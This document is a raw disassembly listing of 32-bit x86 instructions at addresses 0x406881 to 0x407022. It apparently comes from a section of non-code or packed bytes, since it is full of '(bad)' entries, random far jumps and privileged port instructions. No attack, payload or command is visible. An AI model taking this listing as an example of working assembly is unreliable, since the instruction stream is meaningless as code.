  406881:	push   cs
  406882:	mov    ds:0xa27af91,eax
  406887:	inc    esp
  406888:	shl    DWORD PTR [esi+eiz*2-0x7e],0x27
  40688d:	xor    BYTE PTR [edx-0x7943fff5],0x12
  406894:	cmp    eax,0xebd47812
  406899:	je     0x406866
  40689b:	stc    
  40689c:	push   cs
  40689d:	pop    edi
  40689e:	das    
  40689f:	(bad)  
  4068a0:	dec    esp
  4068a1:	sti    
  4068a2:	pop    ebp
  4068a3:	push   ss
  4068a4:	imul   eax,DWORD PTR [ecx+0x6dfacb2e]
  4068ab:	fnstenv [ebp+0x1a]
  4068ae:	jle    0x40691a
  4068b0:	adc    esi,DWORD PTR [esi+0x2bb56dba]
  4068b6:	ds gs and eax,0x35b43a5a
  4068bd:	cmp    ch,BYTE PTR [ecx]
  4068bf:	xchg   BYTE PTR [edi],bh
  4068c1:	fdiv   DWORD PTR [esi]
  4068c3:	fiadd  WORD PTR [ebx+0x2a]
  4068c6:	or     al,0xf6
  4068c8:	push   ss
  4068c9:	in     eax,dx
  4068ca:	jns    0x406874
  4068cc:	push   0xffffff86
  4068ce:	(bad)  
  4068cf:	out    dx,eax
  4068d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068d1:	mov    ch,0x24
  4068d3:	and    DWORD PTR [eax],0xffffffa1
  4068d6:	mov    ss,WORD PTR [ecx+0x4ded34b5]
  4068dc:	aaa    
  4068dd:	cwde   
  4068de:	daa    
  4068df:	jmp    0x66f851b8
  4068e4:	or     edx,DWORD PTR [ebx+ebp*1]
  4068e7:	push   esi
  4068e8:	pop    ecx
  4068e9:	or     ah,BYTE PTR [ecx-0x2f]
  4068ec:	(bad)  [edx+0x3]
  4068ef:	sbb    bh,BYTE PTR [ebx]
  4068f1:	sbb    BYTE PTR [ecx-0x3b3a30c0],0x69
  4068f8:	es loope 0x406888
  4068fb:	sar    BYTE PTR [ecx+ebp*8-0x12],1
  4068ff:	xor    bl,BYTE PTR [ebp-0x2c76007d]
  406905:	lods   al,BYTE PTR ds:[esi]
  406906:	xchg   edx,eax
  406907:	push   esp
  406908:	fisub  DWORD PTR ds:0xd5acd063
  40690e:	(bad)  
  40690f:	nop
  406910:	cdq    
  406911:	ror    DWORD PTR [ecx-0xece79af],1
  406917:	stc    
  406918:	and    ecx,DWORD PTR [esi-0x33e86ef]
  40691e:	and    eax,0x8c475206
  406923:	xchg   DWORD PTR [esi],eax
  406925:	add    al,0xe0
  406927:	jmp    0x14c6:0x92f7183
  40692e:	leave  
  40692f:	dec    esi
  406930:	popf   
  406931:	(bad)  
  406932:	arpl   WORD PTR [ecx+0x51],bx
  406935:	sub    eax,0xb0ae8ce6
  40693a:	inc    BYTE PTR [ebx-0x6d9dfd60]
  406940:	inc    ebp
  406941:	cmc    
  406942:	jne    0x40698e
  406944:	push   cs
  406945:	loop   0x40697f
  406947:	mov    al,0x28
  406949:	hlt    
  40694a:	shl    BYTE PTR [ebx],1
  40694c:	fadd   st(7),st
  40694e:	mov    al,0x35
  406950:	dec    ebp
  406951:	stc    
  406952:	push   ebx
  406953:	fisub  DWORD PTR [eax-0x54]
  406956:	jb     0x406986
  406958:	sahf   
  406959:	neg    bl
  40695b:	gs xchg ebp,eax
  40695d:	out    dx,eax
  40695e:	cmp    DWORD PTR [ebp-0x3697343f],0xae8acb42
  406968:	xor    cl,BYTE PTR [eax]
  40696a:	add    al,BYTE PTR [eax]
  40696c:	and    BYTE PTR [ecx],ch
  40696e:	sbb    al,0x62
  406970:	dec    ecx
  406971:	popa   
  406972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406973:	fld    TBYTE PTR [edi]
  406975:	inc    eax
  406976:	add    BYTE PTR [ebp+0x0],dl
  406979:	cmp    DWORD PTR [ecx],ecx
  40697b:	cld    
  40697c:	and    ebx,edx
  40697e:	xchg   esp,eax
  40697f:	pop    edx
  406980:	ret    
  406981:	neg    DWORD PTR [esi]
  406983:	xchg   edi,eax
  406984:	xchg   esp,eax
  406985:	ins    DWORD PTR es:[edi],dx
  406986:	fmul   DWORD PTR [ecx+0x7cdaac72]
  40698c:	out    0xa8,al
  40698e:	mov    cl,BYTE PTR [ebx-0x635713c4]
  406994:	mov    ch,dh
  406996:	mov    ?,WORD PTR [esi+0x75]
  406999:	and    ebx,DWORD PTR [esi-0x40]
  40699c:	push   ecx
  40699d:	jmp    0xf040:0xd895b191
  4069a4:	jl     0x4069f1
  4069a6:	add    edi,ecx
  4069a8:	sbb    al,BYTE PTR [eax]
  4069aa:	loop   0x4069f9
  4069ac:	stos   BYTE PTR es:[edi],al
  4069ad:	retf   
  4069ae:	add    al,0x57
  4069b0:	jle    0x4069c3
  4069b2:	jg     0x406a2c
  4069b4:	jb     0x406a12
  4069b6:	out    dx,al
  4069b7:	scas   eax,DWORD PTR es:[edi]
  4069b8:	pop    ss
  4069b9:	add    ebx,edi
  4069bb:	scas   al,BYTE PTR es:[edi]
  4069bc:	mov    esp,0x8be68f47
  4069c1:	jae    0x406982
  4069c3:	arpl   WORD PTR [esi-0x317e3446],sp
  4069c9:	fsub   QWORD PTR [edi]
  4069cb:	push   esi
  4069cc:	pop    eax
  4069cd:	loop   0x4069d0
  4069cf:	fsub   st,st(5)
  4069d1:	popf   
  4069d2:	push   0x4
  4069d4:	jnp    0x4069ee
  4069d6:	or     eax,esp
  4069d8:	jbe    0x406a2c
  4069da:	push   es
  4069db:	inc    eax
  4069dc:	inc    edi
  4069dd:	scas   eax,DWORD PTR es:[edi]
  4069de:	and    BYTE PTR [esi+0x5a],0x19
  4069e2:	(bad)  
  4069e3:	jge    0x4069ea
  4069e5:	xlat   BYTE PTR ds:[ebx]
  4069e6:	lock adc al,0x8
  4069e9:	pusha  
  4069ea:	push   edx
  4069eb:	ins    BYTE PTR es:[edi],dx
  4069ec:	loop   0x406983
  4069ee:	pop    ebp
  4069ef:	mov    ds:0xbcaba6b7,al
  4069f4:	add    ch,BYTE PTR [ecx+0x7d11eff8]
  4069fa:	lods   eax,DWORD PTR ds:[esi]
  4069fb:	inc    ebx
  4069fc:	cmp    al,0x91
  4069fe:	ds inc ecx
  406a00:	dec    edx
  406a01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a02:	xchg   dl,ch
  406a04:	xor    eax,ecx
  406a06:	mov    edi,0x4c384631
  406a0b:	xchg   BYTE PTR [ebx-0x685e6c4],dl
  406a11:	clc    
  406a12:	cmp    BYTE PTR [ecx-0x3bf44df8],ch
  406a18:	inc    edi
  406a19:	scas   eax,DWORD PTR es:[edi]
  406a1a:	loop   0x406a28
  406a1c:	mov    al,0xba
  406a1e:	pop    ss
  406a1f:	clc    
  406a20:	jp     0x406a7d
  406a22:	jns    0x4069d9
  406a24:	fcmove st,st(3)
  406a26:	and    ah,ch
  406a28:	cmc    
  406a29:	sbb    DWORD PTR [ebp-0xa2e9eac],0x51
  406a30:	sbb    eax,0xead19695
  406a35:	add    esp,DWORD PTR [eax+edx*4]
  406a38:	stos   BYTE PTR es:[edi],al
  406a39:	into   
  406a3a:	or     al,0x4
  406a3c:	push   0xfdb3f04c
  406a41:	pop    ss
  406a42:	push   es
  406a43:	mov    ds:0xc86191eb,eax
  406a48:	fistp  WORD PTR [ebp-0x19]
  406a4b:	add    BYTE PTR [esp+ebx*1],al
  406a4e:	mov    edx,0x7ca7df9f
  406a53:	mov    ch,0x2a
  406a55:	sbb    DWORD PTR [ecx],ecx
  406a57:	or     BYTE PTR [ebx+0x44b47379],dl
  406a5d:	ret    
  406a5e:	leave  
  406a5f:	sbb    BYTE PTR [ebp-0x41],bh
  406a62:	pushf  
  406a63:	xchg   esp,eax
  406a64:	adc    eax,0x873c18c6
  406a69:	push   0xffffffb3
  406a6b:	hlt    
  406a6c:	out    dx,al
  406a6d:	mov    ds:0x8b14974f,al
  406a72:	adc    bh,BYTE PTR [ebp-0xa]
  406a75:	or     ch,cl
  406a77:	test   edx,ebx
  406a79:	push   es
  406a7a:	daa    
  406a7b:	shl    BYTE PTR [ebx+0x35],1
  406a7e:	jno    0x406a02
  406a80:	and    BYTE PTR [eax],dl
  406a82:	je     0x406a6b
  406a84:	dec    edx
  406a85:	cmp    al,0x7
  406a87:	jg     0x406ac2
  406a89:	mov    ah,0xa9
  406a8b:	mov    edi,DWORD PTR [esi]
  406a8d:	lods   al,BYTE PTR ds:[esi]
  406a8e:	mov    dl,0xa8
  406a90:	imul   ebp,DWORD PTR [edi+0x7e],0x6b4fbe46
  406a97:	outs   dx,DWORD PTR ds:[esi]
  406a98:	lea    ebp,[ebp+0x13]
  406a9b:	xor    BYTE PTR [edi+0x4e5d5f47],bh
  406aa1:	sub    dh,BYTE PTR [ecx]
  406aa3:	or     bl,ah
  406aa5:	mov    esp,0x56e3df57
  406aaa:	push   edx
  406aab:	jecxz  0x406ab6
  406aad:	push   0x0
  406aaf:	or     DWORD PTR [esi],0x9675f2be
  406ab5:	pusha  
  406ab6:	xchg   edx,eax
  406ab7:	(bad)  
  406ab8:	xor    ch,cl
  406aba:	dec    esp
  406abb:	daa    
  406abc:	cli    
  406abd:	mov    edi,0x18602096
  406ac2:	sbb    al,0xa7
  406ac4:	cmp    DWORD PTR [edi],ecx
  406ac6:	dec    esi
  406ac7:	retf   0xef6
  406aca:	lock rcr DWORD PTR ds:0xaff4ed1d,1
  406ad1:	in     eax,dx
  406ad2:	retf   0x87e0
  406ad5:	inc    eax
  406ad6:	bound  esp,QWORD PTR [edx+ebp*2+0x28e1748b]
  406add:	(bad)  
  406ade:	or     eax,0x802008c6
  406ae3:	adc    eax,0x84b0cff
  406ae8:	inc    esi
  406ae9:	gs inc esp
  406aeb:	inc    esp
  406aec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406aed:	out    0xab,eax
  406aef:	test   DWORD PTR [ebx-0x7c],ebp
  406af2:	aad    0x46
  406af4:	les    ecx,FWORD PTR [eax]
  406af6:	cld    
  406af7:	shr    BYTE PTR [ebx],0xd0
  406afa:	sbb    ah,BYTE PTR [edx+ebp*1-0x470e9e75]
  406b01:	push   esp
  406b02:	outs   dx,BYTE PTR ds:[esi]
  406b03:	inc    edx
  406b04:	sahf   
  406b05:	pop    es
  406b06:	add    dh,BYTE PTR [ebp+0x52064050]
  406b0c:	loop   0x406ab9
  406b0e:	mov    ecx,0x73a55721
  406b13:	lea    eax,[edx+0x25]
  406b16:	mov    eax,0x4d0a321e
  406b1b:	std    
  406b1c:	add    eax,DWORD PTR [edi+ebx*4]
  406b1f:	gs sub eax,0xe14d2e15
  406b25:	xchg   cl,al
  406b27:	xchg   edi,eax
  406b28:	sbb    al,0x0
  406b2a:	test   BYTE PTR [ecx+0x113741fe],cl
  406b30:	push   esi
  406b31:	pop    ebx
  406b32:	ret    
  406b33:	cld    
  406b34:	mov    edi,0x8c5f3b1d
  406b39:	jl     0x406ac3
  406b3b:	mov    ah,0x1a
  406b3d:	fs inc esp
  406b3f:	mov    esp,0xe10e69c
  406b44:	xchg   ebx,eax
  406b45:	jecxz  0x406bb5
  406b47:	out    dx,al
  406b48:	loopne 0x406b7d
  406b4a:	(bad)  
  406b4c:	mov    ch,bl
  406b4e:	jge    0x406b14
  406b50:	repz out 0xa5,al
  406b53:	ins    DWORD PTR es:[edi],dx
  406b54:	call   0x9de7:0xcdbf71fa
  406b5b:	(bad)  
  406b5c:	or     DWORD PTR [ecx-0x1a6cb72f],0x76
  406b63:	mov    ah,0x54
  406b65:	add    BYTE PTR [ebx+0x9],ah
  406b68:	(bad)  
  406b6a:	fld    DWORD PTR [esi-0x43]
  406b6d:	arpl   WORD PTR [ebp+0x49],ax
  406b70:	jmp    0x33ff:0xb39a118
  406b77:	leave  
  406b78:	add    DWORD PTR [edx+0x20],edi
  406b7b:	fisubr DWORD PTR [ecx]
  406b7d:	mov    WORD PTR [ecx],cs
  406b7f:	fld    DWORD PTR [ebx]
  406b81:	int3   
  406b82:	or     ch,cl
  406b84:	inc    ebx
  406b85:	fmul   QWORD PTR [edx+edi*1+0x18]
  406b89:	enter  0xa9d3,0x6b
  406b8d:	adc    BYTE PTR [ebx+eiz*2],al
  406b90:	jl     0x406b71
  406b92:	jno    0x406bf8
  406b94:	sbb    eax,0xd4c04802
  406b99:	jl     0x406b79
  406b9b:	(bad)  
  406b9c:	push   esp
  406b9d:	sub    BYTE PTR [edx],0x5e
  406ba0:	mov    gs,WORD PTR [esi]
  406ba2:	out    dx,al
  406ba3:	sbb    eax,0x990649a4
  406ba8:	out    dx,eax
  406ba9:	aaa    
  406baa:	or     al,0xd9
  406bac:	pusha  
  406bad:	out    0x92,al
  406baf:	add    ah,BYTE PTR [esi]
  406bb1:	push   es
  406bb2:	and    DWORD PTR [ebx-0x3c],esp
  406bb5:	add    edi,DWORD PTR [ebp-0x3f227067]
  406bbb:	scas   eax,DWORD PTR es:[edi]
  406bbc:	(bad)  
  406bbe:	fadd   QWORD PTR [edi]
  406bc0:	and    esi,ebx
  406bc2:	xor    bl,al
  406bc4:	mov    BYTE PTR [eax+0xa],cl
  406bc7:	pop    ebx
  406bc8:	add    eax,0x18625fdf
  406bcd:	pop    esp
  406bce:	and    eax,0x73317e5e
  406bd3:	inc    edx
  406bd4:	push   esi
  406bd5:	mov    cl,BYTE PTR [edi-0x44]
  406bd8:	test   BYTE PTR [edx],0xfa
  406bdb:	ficom  WORD PTR [ecx-0x55f68eb7]
  406be1:	call   0x34bd7ea0
  406be6:	pop    edx
  406be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406be8:	in     eax,dx
  406be9:	daa    
  406bea:	mov    esi,DWORD PTR [edx+0x30397c8a]
  406bf0:	jns    0x406c5e
  406bf2:	das    
  406bf3:	shl    BYTE PTR [ebx+0x39],0x71
  406bf7:	add    BYTE PTR [eax+0x8de361f],0x15
  406bfe:	(bad)  
  406bff:	mov    ebp,0x91b9077c
  406c04:	cmp    BYTE PTR [ebp-0x6f],ah
  406c07:	xchg   esp,eax
  406c08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c09:	xor    edi,DWORD PTR [edi+0x3c]
  406c0c:	inc    edi
  406c0d:	cmp    DWORD PTR [esi+0x61],esp
  406c10:	push   eax
  406c11:	cmp    eax,0x423f00c0
  406c16:	jae    0x406bd2
  406c18:	cmp    esi,esp
  406c1a:	cld    
  406c1b:	punpckhbw mm1,QWORD PTR [edi+0x24c0400e]
  406c22:	xlat   BYTE PTR ds:[ebx]
  406c23:	fadd   st(7),st
  406c25:	int3   
  406c26:	add    eax,0x578e29e3
  406c2b:	pushf  
  406c2c:	mov    ecx,0x88f88c76
  406c31:	mov    eax,0x9e805154
  406c36:	mov    es,WORD PTR [ecx]
  406c38:	xor    BYTE PTR [edx+ebp*2+0x583b4c56],cl
  406c3f:	sub    al,0xa5
  406c41:	add    DWORD PTR [ebx],esp
  406c43:	scas   eax,DWORD PTR es:[edi]
  406c44:	mov    ds:0x68ba630e,eax
  406c49:	dec    ebx
  406c4a:	push   esi
  406c4b:	dec    ebx
  406c4c:	test   DWORD PTR ds:0x890c2269,edx
  406c52:	push   cs
  406c53:	mov    edi,ecx
  406c55:	stos   DWORD PTR es:[edi],eax
  406c56:	in     eax,0x18
  406c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c59:	add    edi,DWORD PTR [eax-0x62a5fe93]
  406c5f:	cmp    al,0x86
  406c61:	mov    al,0x17
  406c63:	and    BYTE PTR [eax+ebx*1+0x26f390e0],al
  406c6a:	jmp    0xd2b60e31
  406c6f:	idiv   ebx
  406c71:	(bad)  
  406c72:	push   ds
  406c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c74:	jne    0x406c9f
  406c76:	and    eax,0xfa9d0c09
  406c7b:	mov    edx,esi
  406c7d:	add    ch,BYTE PTR [ecx+0x4f]
  406c80:	or     eax,0xcb37a768
  406c85:	iret   
  406c86:	jmp    0x76d:0xae7f0ed3
  406c8d:	hlt    
  406c8e:	jae    0x406c4f
  406c90:	inc    esi
  406c91:	dec    ebx
  406c92:	add    al,BYTE PTR [edi-0x4b]
  406c95:	sub    eax,0x87b7e001
  406c9a:	ret    0x1ed
  406c9d:	das    
  406c9e:	pop    ecx
  406c9f:	add    BYTE PTR [eax+0x16],ch
  406ca2:	in     al,0x3
  406ca4:	std    
  406ca5:	jge    0x406cff
  406ca7:	push   edi
  406ca8:	jle    0x406c63
  406caa:	test   al,0xca
  406cac:	call   0xaae4:0x1e267720
  406cb3:	xor    eax,0xb4f4343d
  406cb8:	dec    edx
  406cb9:	int    0xbd
  406cbb:	dec    ecx
  406cbc:	aas    
  406cbd:	pusha  
  406cbe:	pop    ebp
  406cbf:	(bad)  
  406cc0:	loop   0x406c59
  406cc2:	pop    ecx
  406cc3:	int3   
  406cc4:	adc    eax,0xa24f8bf7
  406cc9:	es and al,0x69
  406ccc:	into   
  406ccd:	jg     0x406d3b
  406ccf:	mov    dh,BYTE PTR [edi]
  406cd1:	fdiv   QWORD PTR [edi-0x46f57f8e]
  406cd7:	mov    ds:0x1d479a4c,al
  406cdc:	in     eax,0xb6
  406cde:	jno    0x406d25
  406ce0:	es fs xor ecx,edx
  406ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce5:	inc    esi
  406ce6:	sbb    BYTE PTR [eax],ch
  406ce8:	imul   edx,DWORD PTR [edi],0xf88c95d3
  406cee:	pop    es
  406cef:	into   
  406cf0:	mov    WORD PTR [ebx+0x7b],cs
  406cf3:	dec    esp
  406cf4:	sti    
  406cf5:	adc    BYTE PTR [ecx+0x2a0f18f7],dh
  406cfb:	add    al,BYTE PTR [esi+ebx*4-0x369d6666]
  406d02:	ins    DWORD PTR es:[edi],dx
  406d03:	inc    esi
  406d04:	or     al,0x4c
  406d06:	mov    ds:0x6815e564,eax
  406d0b:	popf   
  406d0c:	aad    0xd3
  406d0e:	iret   
  406d0f:	jecxz  0x406cfc
  406d11:	xchg   ebp,eax
  406d12:	add    al,0xa1
  406d14:	ret    0x1083
  406d17:	xor    edi,DWORD PTR [ebp-0x6b]
  406d1a:	cwde   
  406d1b:	xor    ebp,esi
  406d1d:	dec    ebp
  406d1e:	dec    eax
  406d1f:	cmp    bh,ch
  406d21:	dec    eax
  406d22:	mov    ah,0x4a
  406d24:	xchg   ebx,eax
  406d25:	ins    DWORD PTR es:[edi],dx
  406d26:	jno    0x406d69
  406d28:	jge    0x406cae
  406d2a:	repnz inc edx
  406d2c:	pop    es
  406d2d:	mov    ebp,0x8f4623bc
  406d32:	xchg   esp,eax
  406d33:	cmp    esp,DWORD PTR [ebx+ebx*2]
  406d36:	in     eax,dx
  406d37:	or     DWORD PTR [esi-0x47339dec],edx
  406d3d:	aaa    
  406d3e:	lds    ebp,FWORD PTR [ebx+0x6997cf14]
  406d44:	xchg   esp,eax
  406d45:	inc    ebp
  406d46:	ret    
  406d47:	mov    ds:0x9c30023c,eax
  406d4c:	dec    ebp
  406d4d:	repz xchg ebx,eax
  406d4f:	ret    0x7a18
  406d52:	mov    BYTE PTR [ebx-0x1d68a450],0x17
  406d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d5a:	clc    
  406d5b:	fcomp  QWORD PTR [edi-0x58]
  406d5e:	into   
  406d5f:	ror    BYTE PTR [edi],cl
  406d61:	arpl   WORD PTR [edx-0x5c607f82],di
  406d67:	or     DWORD PTR [esi-0x30eecfb6],edx
  406d6d:	jmp    0x406d1e
  406d6f:	mov    bl,0xae
  406d71:	cmp    eax,0x90eeb52e
  406d76:	ds or  al,0x5b
  406d79:	sbb    BYTE PTR [ecx-0x3],0x9f
  406d7d:	dec    edi
  406d7e:	add    BYTE PTR [eax],dh
  406d80:	jecxz  0x406da0
  406d82:	push   esp
  406d83:	test   DWORD PTR [esi+0x68],0x3d780a4e
  406d8a:	or     dh,BYTE PTR [ecx+0x26]
  406d8d:	mov    ebx,0xb8eb3f69
  406d92:	xchg   edx,ebp
  406d94:	lods   al,BYTE PTR ds:[esi]
  406d95:	sti    
  406d96:	lahf   
  406d97:	sub    dh,BYTE PTR [edx+0x7f]
  406d9a:	iret   
  406d9b:	test   DWORD PTR [edi+0x39],ebx
  406d9e:	push   cs
  406d9f:	or     esp,edx
  406da1:	mov    esp,0x40661ab2
  406da6:	and    dl,bh
  406da8:	pop    edx
  406da9:	sbb    eax,0x69748dba
  406dae:	push   esp
  406daf:	in     al,dx
  406db0:	cmp    DWORD PTR [ecx+0x74cf0ec7],esp
  406db6:	pop    es
  406db7:	xor    edx,DWORD PTR [esp+ebp*4-0x66aa1d22]
  406dbe:	imul   eax,edi,0x2a
  406dc1:	push   edx
  406dc2:	add    DWORD PTR [ebp+0x6a],edx
  406dc5:	add    ecx,eax
  406dc7:	xor    al,0x8e
  406dc9:	mov    DWORD PTR ds:0xd18e6887,ebx
  406dcf:	and    BYTE PTR ds:0x1c9e66c,bl
  406dd5:	pop    DWORD PTR [eax]
  406dd7:	retf   0xd5ab
  406dda:	mov    eax,ds:0xecaf806
  406ddf:	je     0x406e10
  406de1:	jmp    0x8cfbb02b
  406de6:	and    DWORD PTR [ecx-0x78],esp
  406de9:	out    0xc0,eax
  406deb:	jmp    0x91959bc7
  406df0:	sub    DWORD PTR [ecx-0x6a],0x55db7144
  406df7:	sub    DWORD PTR ds:0x6b067531,eax
  406dfd:	add    BYTE PTR [eax],al
  406dff:	out    0x68,al
  406e01:	lea    esp,[ebp+0x635f3cc7]
  406e07:	and    eax,0x7d48deff
  406e0c:	bound  ebx,QWORD PTR [edi-0x37ce061f]
  406e12:	in     eax,dx
  406e13:	inc    ecx
  406e14:	add    al,0xe3
  406e16:	cmp    ebx,DWORD PTR [ecx+0x15]
  406e19:	pop    edx
  406e1a:	fwait
  406e1b:	lahf   
  406e1c:	push   0x4ea042c4
  406e21:	(bad)
  406e24:	dec    ebp
  406e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e26:	add    eax,0x34a98000
  406e2b:	or     eax,0x7ef3ab82
  406e30:	push   edx
  406e31:	out    dx,al
  406e32:	out    dx,al
  406e33:	mov    al,ds:0xc3cf4014
  406e38:	pop    eax
  406e39:	imul   eax,DWORD PTR ds:[eax],0x8
  406e3d:	pop    ebx
  406e3e:	or     eax,0x235e3ab0
  406e43:	dec    ecx
  406e44:	sub    edi,DWORD PTR [esp+ebx*4-0xb]
  406e48:	sar    edi,cl
  406e4a:	adc    bl,BYTE PTR [ebp+0x25]
  406e4d:	loop   0x406de3
  406e4f:	pop    eax
  406e50:	lds    edi,FWORD PTR [ecx-0x272551ed]
  406e56:	inc    ebx
  406e57:	outs   dx,DWORD PTR ds:[esi]
  406e58:	cmp    DWORD PTR [ecx+0x62],ebx
  406e5b:	inc    esp
  406e5c:	sub    al,0x89
  406e5e:	icebp  
  406e5f:	add    al,0x6e
  406e61:	xchg   ecx,eax
  406e62:	xchg   DWORD PTR [esi+0xc],edx
  406e65:	sar    BYTE PTR [esi-0x6c2ed10a],cl
  406e6b:	xor    DWORD PTR [eax-0x5823f0f2],ebp
  406e71:	lods   al,BYTE PTR ds:[esi]
  406e72:	jnp    0x406dfd
  406e74:	mov    eax,0x3f12a4c
  406e79:	sub    edi,DWORD PTR [edx]
  406e7b:	pop    esp
  406e7c:	jp     0x406e96
  406e7e:	inc    eax
  406e7f:	inc    edx
  406e80:	add    DWORD PTR [edi],ecx
  406e82:	iret   
  406e83:	shl    DWORD PTR [esi],cl
  406e85:	add    DWORD PTR [eax-0x73f3518f],ecx
  406e8b:	mov    cl,0xb
  406e8d:	sub    BYTE PTR [ecx+0x77],0x32
  406e91:	add    BYTE PTR [edi+ecx*8],ah
  406e94:	mov    WORD PTR [edi],?
  406e96:	inc    eax
  406e97:	or     ch,BYTE PTR [ebp-0x7b]
  406e9a:	into   
  406e9b:	cmp    eax,0x9d501a98
  406ea0:	mov    ?,ebx
  406ea2:	and    al,0x71
  406ea4:	mov    BYTE PTR [edx],bl
  406ea6:	mov    DWORD PTR [edi],edi
  406ea8:	scas   al,BYTE PTR es:[edi]
  406ea9:	icebp  
  406eaa:	add    bl,BYTE PTR [eax+0x52]
  406ead:	add    al,0x18
  406eaf:	pop    ebx
  406eb0:	mov    ds:0x68db44f4,al
  406eb5:	adc    ecx,DWORD PTR [ebx-0x1]
  406eb8:	stc    
  406eb9:	dec    esi
  406eba:	pop    ebp
  406ebb:	aad    0x9
  406ebd:	pusha  
  406ebe:	jno    0x406ef0
  406ec0:	retf   
  406ec1:	dec    esp
  406ec2:	setno  ch
  406ec5:	push   0x1ad56485
  406eca:	jb     0x406ed2
  406ecc:	les    eax,FWORD PTR ds:0x5adfe309
  406ed2:	sahf   
  406ed3:	push   ebx
  406ed4:	dec    eax
  406ed5:	or     eax,DWORD PTR [esi]
  406ed7:	pusha  
  406ed8:	mov    esp,0x1fa59ca1
  406edd:	inc    esp
  406ede:	push   esp
  406edf:	loope  0x406ead
  406ee1:	mov    esi,0xb0fd2f48
  406ee6:	mov    ebp,0x9ad0c62c
  406eeb:	add    esi,DWORD PTR [ebx-0x5b]
  406eee:	sbb    cl,BYTE PTR [esi]
  406ef0:	call   0xaba3378d
  406ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ef6:	sbb    al,0xc9
  406ef8:	push   es
  406ef9:	clc    
  406efa:	int3   
  406efb:	jmp    0xafa4:0xebd97d3c
  406f02:	xor    BYTE PTR [ebx],dh
  406f04:	mov    eax,ds:0xfd36306d
  406f09:	out    dx,eax
  406f0a:	sahf   
  406f0b:	dec    ecx
  406f0c:	push   ebp
  406f0d:	out    dx,eax
  406f0e:	cs pop ebp
  406f10:	xchg   ebx,eax
  406f11:	pop    edx
  406f12:	add    ebp,DWORD PTR [ecx-0x66]
  406f15:	das    
  406f16:	add    DWORD PTR [ebx+ebp*2+0x1462c00c],ebx
  406f1d:	or     eax,0xedb0001
  406f22:	mov    al,0x53
  406f24:	xchg   esi,eax
  406f25:	icebp  
  406f26:	or     BYTE PTR [ebp+0x2d],bh
  406f29:	fimul  WORD PTR [ebx-0x39]
  406f2c:	repnz retf 0xb725
  406f30:	aaa    
  406f31:	imul   eax,DWORD PTR [edx-0x59],0x1d
  406f35:	dec    ecx
  406f36:	(bad)  
  406f37:	and    DWORD PTR [ebp-0x5e2e62b2],ebx
  406f3d:	ror    dl,0x26
  406f40:	loopne 0x406f8d
  406f42:	in     eax,0xa0
  406f44:	aas    
  406f45:	mov    dh,0xca
  406f47:	test   DWORD PTR [ecx+0x35],eax
  406f4a:	ret    0x20b3
  406f4d:	dec    eax
  406f4e:	or     cl,BYTE PTR [ecx]
  406f50:	bound  ecx,QWORD PTR [eax]
  406f52:	and    BYTE PTR [edx+0x2007db57],bh
  406f58:	(bad)  
  406f59:	mov    bh,0xfb
  406f5b:	mov    esi,0x56e6b156
  406f60:	jnp    0x406f85
  406f62:	adc    eax,0x8e907048
  406f67:	push   es
  406f68:	int3   
  406f69:	cli    
  406f6a:	retf   0xa42b
  406f6d:	pop    esp
  406f6e:	cld    
  406f6f:	mov    esi,0x33eb79e
  406f74:	stc    
  406f75:	call   0xa4e4:0xc4d10246
  406f7c:	mov    WORD PTR [ebx-0x1386e1e8],ds
  406f82:	adc    dh,BYTE PTR [ecx-0x173802c8]
  406f88:	cwde   
  406f89:	mov    eax,0x51a84162
  406f8e:	or     BYTE PTR [edx],bl
  406f90:	nop
  406f91:	in     al,0xa1
  406f93:	or     BYTE PTR [ebx+0x4bca29c6],al
  406f99:	push   es
  406f9a:	imul   edx,DWORD PTR [edi-0x40b5e474],0xf68162c9
  406fa4:	lock retf 
  406fa6:	and    al,0x6d
  406fa8:	and    DWORD PTR [ecx-0x16],ecx
  406fab:	pop    edx
  406fac:	scas   eax,DWORD PTR es:[edi]
  406fad:	dec    esi
  406fae:	pop    ebx
  406faf:	mov    ch,0x7
  406fb1:	jmp    0xc49:0x3feb9e56
  406fb8:	sar    BYTE PTR [edi-0x65],cl
  406fbb:	ds dec ebp
  406fbd:	and    esp,DWORD PTR [ebx+0x53]
  406fc0:	adc    al,BYTE PTR [ecx]
  406fc2:	sub    dh,dh
  406fc4:	add    BYTE PTR [ecx-0x506fc5ca],0xd1
  406fcb:	inc    ecx
  406fcc:	pop    edi
  406fcd:	add    DWORD PTR [eax],eax
  406fcf:	(bad)  
  406fd0:	xor    ch,al
  406fd2:	adc    DWORD PTR [eax-0x52],edi
  406fd5:	mov    ds:0x19cf03,eax
  406fda:	in     al,dx
  406fdb:	dec    ecx
  406fdc:	pusha  
  406fdd:	xor    edx,DWORD PTR [esi+0x4a]
  406fe0:	lea    eax,[eax]
  406fe2:	scas   eax,DWORD PTR es:[edi]
  406fe3:	in     al,dx
  406fe4:	mov    esi,0x8c97b920
  406fe9:	shl    ch,1
  406feb:	or     al,0x0
  406fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fee:	cdq    
  406fef:	push   es
  406ff0:	cwde   
  406ff1:	lods   eax,DWORD PTR ds:[esi]
  406ff2:	bound  esi,QWORD PTR [esi+0x78a74eb]
  406ff8:	push   es
  406ff9:	imul   ebx,DWORD PTR [edi+ebx*1+0x3be24164],0x20c29dbd
  407004:	pop    eax
  407005:	std    
  407006:	mov    cl,0x12
  407008:	jg     0x40701a
  40700a:	xor    ebx,esi
  40700c:	cli    
  40700d:	shl    DWORD PTR [ecx],0x5
  407010:	fadd   QWORD PTR [eax-0x692efa0]
  407016:	test   ebx,edi
  407018:	in     al,dx
  407019:	ss inc edi
  40701b:	pop    ecx
  40701c:	mov    ah,bl
  40701e:	push   esi
  40701f:	pop    eax
  407020:	(bad)  
  407021:	in     eax,dx
  407022:	aas    
